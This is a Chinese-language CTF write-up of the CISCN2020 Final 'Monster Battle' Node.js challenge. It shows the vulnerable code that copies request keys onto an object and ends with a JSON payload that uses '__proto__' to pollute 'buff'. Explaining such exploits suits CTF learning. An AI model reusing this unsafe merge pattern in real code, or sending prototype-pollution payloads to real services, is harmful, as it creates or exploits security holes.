# CISCN2020 Final  Monster Battle
这是源码[传送门](./web2-src.zip), 先`npm install`安装依赖, 再`node app.js`运行环境即可
题目给了源码, 打斗的逻辑并不复杂, 关键部分其实主要就下面这些
```js

let tempPlayer = req.body

        for ( let i in tempPlayer )
        {
            if (player[i]) {
                if ( (i == 'career' && !careers.includes(tempPlayer[i])) || (i == 'item' && !items.includes(tempPlayer[i])) || (i == 'round_to_use' && !checkRound(tempPlayer[i])) || tempPlayer[i] === '') {
                    continue
                }
                player[i] = tempPlayer[i] //存在可控键名, 即key、value均可控
            }
        }
        player.num = 1; //player剩余可`使用物品`的次数
        player.HP = 100; //HP为血量
        player.aggressivity = getPlayerAggressivity()

        initMonster()
        res.redirect("/battle")
    } else {
        res.redirect("/")
    }
})
```
那么只需污染没有初始化的参数即可，要么【让我们变强】，要么【让怪兽变弱】，显然前者更为容易，因为有一个特殊的机——buff。
在源码中， buff的作用是在计算纯粹伤害的时候体现，因此，只要我们将buff的值设置为很大，即可达到瞬秒怪兽的效果。
```js
function  getPlayerDamageValue() //计算纯粹伤害
{
    if (player.buff) {
        return keepTwoDecimal(player.aggressivity+player.buff)
    } else return player.aggressivity
}
```
当然，此题还有一点需注意，要想保持高buff, 对人物角色和技能都有一定限制
```js
function triggerPassiveSkill() //触发被动技能
{
    switch (player.career) {
        case "warrior":
            player.buff = 5
            return 1
        case "high_priest" :
            player.HP += 10
            player.HP = keepTwoDecimal(player.HP)
            return 2
        case 'shooter' :
            player.buff = 7
            return 3
        default:
            return 0
    }
}
```
上面这点, 决定了我们的身份只能是`high_priest`, 因为当流程进入其它两个分支时, 都会将buff变为正常值.
而下面的代码, 则决定了我们的技能最好不要是`BYZF`, 因为当进入这个分支时, buff值也会变为正常值(可以设定为第二、三回合再使用技能, 但不够暴力没内味儿)
```js
function playerUseItem(round)
{
    //ZLYG：治疗药膏，使用后回复10点生命值
    //BYZF：白银之锋，使用后的一次攻击将触发暴击并造成130%的伤害
    //XELD：邪恶镰刀，使用后将对方的一次攻击的攻击力变为80%
    if (round == player.round_to_use && player.num == 1)
    {
        player.num = 0;
        switch (player.item) {
            case "ZLYG":
                player.HP += 10;
                return  1;
            case "BYZF":
                player.buff = player.aggressivity * 0.3;
                player.buff = keepTwoDecimal(player.buff)
                return 2;
            case "XELD":
                monster.buff = monster.aggressivity * (1 - 0.8) * (-1);
                monster.buff = keepTwoDecimal(monster.buff)
                return 3;
        }
    } else return 0
}
```
最终payload, 同样：请注意请求头`Content-Type: application/json`
```http
POST /start HTTP/1.1
Content-Type: application/json

{"name":1, "round_to_use":2, "career":"high_priest", "item":"BYZF","__proto__":{"buff":10000}}
```
